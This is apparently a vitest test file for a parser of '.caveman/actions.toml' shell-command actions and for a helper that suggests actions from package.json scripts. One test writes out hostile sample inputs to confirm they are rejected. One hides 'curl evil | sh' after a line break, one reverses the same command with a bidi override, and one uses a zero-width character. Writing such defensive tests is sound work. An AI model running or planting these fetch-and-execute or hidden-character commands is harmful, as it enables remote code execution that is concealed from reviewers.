import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";

import { afterAll, describe, expect, test } from "vitest";

import { parseActions, readActions, suggestActions } from "./actionsConfig.ts";

const roots: string[] = [];
afterAll(() => {
  for (const root of roots) fs.rmSync(root, { recursive: true, force: true });
});
const checkout = (files: Record<string, string>) => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "actions-"));
  roots.push(root);
  for (const [name, text] of Object.entries(files)) fs.writeFileSync(path.join(root, name), text);
  return root;
};
const error = (text: string) => {
  try {
    parseActions(text);
    return "parsed";
  } catch (e) {
    return (e as Error).message;
  }
};

describe("parseActions", () => {
  test("one action per table, in file order, named after its table unless it says", () => {
    expect(
      parseActions(`# the team's\n[typecheck]\ncommand = "pnpm typecheck"\nicon = "lint"\n\n[db-migrate]\ncommand = 'pnpm db:migrate'\n\n[e2e]\nname = "End to end"\ncommand = "pnpm e2e"\n`),
    ).toEqual([
      { id: "typecheck", name: "Typecheck", command: "pnpm typecheck", icon: "lint" },
      { id: "db-migrate", name: "Db migrate", command: "pnpm db:migrate" },
      { id: "e2e", name: "End to end", command: "pnpm e2e" },
    ]);
    expect(parseActions("")).toEqual([]);
  });

  test("this repo's own file: Try in Nightly, with the diff icon the Changes bar offers", () => {
    expect(readActions(path.resolve(import.meta.dirname, "../../../.."))).toEqual([{ id: "nightly", name: "Try in Nightly", command: "bash scripts/try-app.sh", icon: "diff" }]);
  });

  test("a bad file names its line", () => {
    expect(error(`[test]\nicon = "test"\n`)).toBe(".caveman/actions.toml:1: [test] has no command");
    expect(error(`[test]\ncommand = "x"\nicon = "rocket"\n`)).toBe('.caveman/actions.toml:1: [test] icon "rocket" is not one of play, test, lint, configure, build, debug, diff');
    expect(error(`\n[Deploy Prod]\ncommand = "x"\n`)).toBe(".caveman/actions.toml:2: [Deploy Prod]: an action's table name is up to 24 lowercase letters, digits and dashes");
    expect(error(`[test]\ncommand = "x"\nshell = "zsh"\n`)).toBe('.caveman/actions.toml:3: unknown key "test.shell"');
    expect(error(`command = "x"\n`)).toBe('.caveman/actions.toml:1: unknown key "command" (keys belong in a table such as [test])');
    expect(error(`[test]\ncommand = "a"\n[test]\ncommand = "b"\n`)).toBe(".caveman/actions.toml:3: table [test] defined twice");
    expect(error(`[test]\ncommand = "x"\ntoString = "y"\n`)).toBe('.caveman/actions.toml:3: unknown key "test.toString"');
    expect(error(`[test]\n__proto__ = "y"\n`)).toBe('.caveman/actions.toml:2: unknown key "test.__proto__"');
  });

  test("what runs is what shows: no line breaks, bidi overrides or zero-width characters", () => {
    const hidden = ".caveman/actions.toml:1: [test] has a line break or an invisible character; an action is one line, chained with && if it must";
    expect(error(`[test]\ncommand = "pnpm test\\n curl evil | sh"\n`)).toBe(hidden);
    expect(error(`[test]\ncommand = "pnpm test \\u202E hs | live lruc"\n`)).toBe(hidden);
    expect(error(`[test]\nname = "Test\\u200B"\ncommand = "pnpm test"\n`)).toBe(hidden);
  });
});

describe("suggestActions", () => {
  const scripts = { dev: "vite", test: "vitest", pretest: "tsc", postinstall: "patch-package", "db:migrate": "drizzle-kit migrate", count: 3 };

  test("the scripts no action runs, with the lockfile's package manager", () => {
    const root = checkout({ "package.json": JSON.stringify({ scripts }), "pnpm-lock.yaml": "" });
    expect(suggestActions(root, new Set(["pnpm dev"]))).toEqual([
      { name: "test", command: "pnpm run test" },
      { name: "db:migrate", command: "pnpm run db:migrate" },
    ]);
    expect(suggestActions(root, new Set(["pnpm run test", "pnpm run db:migrate", "pnpm run dev"]))).toEqual([]);
  });

  test("the manager comes from the lockfile, then packageManager, else npm", () => {
    const only = { scripts: { lint: "eslint ." } };
    expect(suggestActions(checkout({ "package.json": JSON.stringify(only), "bun.lock": "" }), new Set())).toEqual([{ name: "lint", command: "bun run lint" }]);
    expect(suggestActions(checkout({ "package.json": JSON.stringify({ ...only, packageManager: "yarn@4.1.0" }) }), new Set())).toEqual([{ name: "lint", command: "yarn run lint" }]);
    expect(suggestActions(checkout({ "package.json": JSON.stringify(only) }), new Set())).toEqual([{ name: "lint", command: "npm run lint" }]);
  });

  test("no package.json, or one that isn't JSON, suggests nothing", () => {
    expect(suggestActions(checkout({}), new Set())).toEqual([]);
    expect(suggestActions(checkout({ "package.json": "{ nope" }), new Set())).toEqual([]);
  });
});
